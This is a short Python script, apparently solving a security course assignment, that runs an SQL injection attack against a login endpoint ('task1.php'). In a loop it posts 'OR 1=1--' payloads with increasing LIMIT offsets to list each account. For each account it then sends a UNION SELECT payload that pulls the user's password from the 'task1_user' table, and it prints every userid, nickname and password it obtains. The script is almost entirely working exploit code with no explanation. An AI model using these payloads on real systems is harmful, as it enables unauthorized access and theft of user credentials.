import requests
import json

ASSIGN2_BASE = "[Your-server-base]"
print('[ userid / nickname / passwd ] :')
cnt=0
while(1):
    resp = requests.post("{}/task1.php".format(ASSIGN2_BASE),data = {"userid": "asdfadfaa' OR 1=1-- ","passwd": "adfadfadads' or 1=1 LIMIT {0},1-- ".format(cnt)})
    rp=json.loads(resp.text)
    if(rp['status']!='success'): break
    resp = requests.post("{}/task1.php".format(ASSIGN2_BASE),data = {"userid": "adfadfafsd","passwd": "adfadfadads' UNION SELECT userid, passwd as nickname FROM task1_user WHERE userid='{0}'-- ".format(rp['data']['name'])})
    rp2=json.loads(resp.text)
    print(rp['data']['name'],'/',rp['data']['nickname'], '/',rp2['data']['nickname'])
    cnt+=1